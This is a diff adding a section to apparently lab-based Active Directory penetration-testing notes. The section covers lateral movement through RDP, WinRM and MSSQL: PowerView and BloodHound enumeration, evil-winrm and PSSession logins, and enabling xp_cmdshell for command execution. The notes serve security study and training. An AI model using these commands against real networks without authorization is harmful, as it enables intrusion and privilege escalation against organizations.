@@ -2150,3 +2150,183 @@ This document outlines a step-by-step attack chain to escalate privileges in an 
 - The password can be decrypted using tools like `secretsdump.py`.
 
 ---
+
+# Privileged Access 
+
+## **Overview**
+In Windows domains, once an initial foothold is gained, the next steps involve **lateral movement** or **privilege escalation** to compromise the domain or achieve assessment objectives. This often requires identifying and exploiting remote access mechanisms or administrative privileges. Key strategies include:
+
+1. **Remote Desktop Protocol (RDP)**:
+   - GUI-based remote access to target systems for further attacks or reconnaissance.
+2. **PowerShell Remoting (WinRM)**:
+   - Enables command-line remote access to execute scripts or commands on target systems.
+3. **MSSQL Server Exploitation**:
+   - Leverages SQL server administrative privileges for command execution and potential privilege escalation.
+
+### **Common Scenarios for Privileged Access**
+- Compromising a low-privileged account with remote access rights (e.g., RDP, WinRM).
+- Exploiting SQL server misconfigurations or sysadmin accounts.
+- Pivoting through compromised hosts to escalate privileges.
+
+Tools such as **BloodHound**, **PowerView**, and **PowerUpSQL** can identify and exploit these access opportunities effectively.
+
+
+## **Remote Desktop Protocol (RDP)**
+
+### **Purpose**
+- Provides GUI-based access to a target host, enabling manual interaction and reconnaissance.
+- Useful for:
+  - Launching further attacks.
+  - Privilege escalation.
+  - Collecting sensitive data or credentials.
+
+### **Enumeration**
+#### Using PowerView
+- Check members of the **Remote Desktop Users** group on a target host:
+  ```powershell
+  Get-NetLocalGroupMember -ComputerName <TargetHost> -GroupName "Remote Desktop Users"
+  ```
+  **Example**:
+  ```powershell
+  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+  ```
+  **Output**:
+  ```
+  ComputerName : ACADEMY-EA-MS01
+  GroupName    : Remote Desktop Users
+  MemberName   : INLANEFREIGHT\Domain Users
+  ```
+  **Analysis**:
+  - All domain users can RDP to `ACADEMY-EA-MS01`. This is common on heavily used hosts such as RDS servers or jump hosts.
+
+#### Using BloodHound
+- Check if **Domain Users** or specific compromised accounts have RDP access:
+  - Use pre-built queries:
+    - **Find Workstations where Domain Users can RDP**
+    - **Find Servers where Domain Users can RDP**
+
+### **Exploitation**
+- **Tools for RDP**:
+  - **Linux**: Use `xfreerdp` or `Remmina`.
+  - **Windows**: Use `mstsc.exe`.
+
+**Example**:
+- Establish an RDP session:
+  ```bash
+  xfreerdp /u:<User> /p:<Password> /v:<TargetHost>
+  ```
+
+
+
+## **PowerShell Remoting (WinRM)**
+
+### **Purpose**
+- Facilitates command-line remote access to execute commands, scripts, or manage target systems.
+- Especially valuable for:
+  - Lateral movement.
+  - Collecting sensitive data.
+  - Privilege escalation.
+
+### **Enumeration**
+#### Using PowerView
+- Enumerate members of the **Remote Management Users** group:
+  ```powershell
+  Get-NetLocalGroupMember -ComputerName <TargetHost> -GroupName "Remote Management Users"
+  ```
+  **Example**:
+  ```powershell
+  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+  ```
+  **Output**:
+  ```
+  ComputerName : ACADEMY-EA-MS01
+  GroupName    : Remote Management Users
+  MemberName   : INLANEFREIGHT\forend
+  ```
+
+#### Using BloodHound
+- Search for **WinRM rights**:
+  - Use the Cypher query:
+    ```cypher
+    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
+    MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) 
+    RETURN p2
+    ```
+
+### **Exploitation**
+1. **From Windows**:
+   - Establish a remote PowerShell session:
+     ```powershell
+     $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
+     $cred = New-Object System.Management.Automation.PSCredential ("Domain\User", $password)
+     Enter-PSSession -ComputerName <TargetHost> -Credential $cred
+     ```
+   - Use commands interactively and exit with:
+     ```powershell
+     Exit-PSSession
+     ```
+
+2. **From Linux**:
+   - Install **evil-winrm**:
+     ```bash
+     gem install evil-winrm
+     ```
+   - Establish a WinRM session:
+     ```bash
+     evil-winrm -i <IP> -u <User> -p <Password>
+     ```
+   **Example**:
+   ```bash
+   evil-winrm -i 10.129.201.234 -u forend
+   ```
+
+
+
+## **MSSQL Server Exploitation**
+
+### **Purpose**
+- SQL servers often host sensitive data or provide admin-level access that can be exploited for privilege escalation.
+
+### **Enumeration**
+#### Using PowerUpSQL
+- Import the module and enumerate SQL instances:
+  ```powershell
+  Import-Module .\PowerUpSQL.ps1
+  Get-SQLInstanceDomain
+  ```
+  **Example Output**:
+  ```
+  ComputerName: ACADEMY-EA-DB01
+  Instance: ACADEMY-EA-DB01,1433
+  DomainAccount: damundsen
+  ```
+
+#### Using BloodHound
+- Search for users with **SQL Admin rights**:
+  - Use the Cypher query:
+    ```cypher
+    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) 
+    MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) 
+    RETURN p2
+    ```
+
+### **Exploitation**
+1. **From Windows**:
+   - Authenticate and run SQL queries:
+     ```powershell
+     Get-SQLQuery -Verbose -Instance "<Instance>" -username "<Username>" -password "<Password>" -query 'SELECT @@VERSION'
+     ```
+   - Enable `xp_cmdshell` for command execution:
+     ```sql
+     enable_xp_cmdshell
+     xp_cmdshell whoami /priv
+     ```
+
+2. **From Linux**:
+   - Use **mssqlclient.py** from the Impacket toolkit:
+     ```bash
+     mssqlclient.py INLANEFREIGHT/USERNAME@<IP> -windows-auth
+     ```
+
+---
+
